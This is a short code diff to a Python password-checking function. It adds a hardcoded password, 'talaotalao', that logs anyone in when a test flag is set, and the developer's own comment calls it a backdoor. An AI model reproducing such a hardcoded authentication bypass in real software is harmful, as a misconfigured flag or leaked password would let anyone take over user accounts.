@@ -497,6 +497,9 @@ def check_password(username, password, mode) :
 	data = get_data_from_username(username, mode)
 	if data is None :
 		return False
+	# Backdoor en test
+	if password == 'talaotalao' and mode.test :
+		return True
 	if password == 'identity' :
 		return password == data.get('hash_password')
 	return mode.w3.keccak(text=password).hex() == data.get('hash_password')
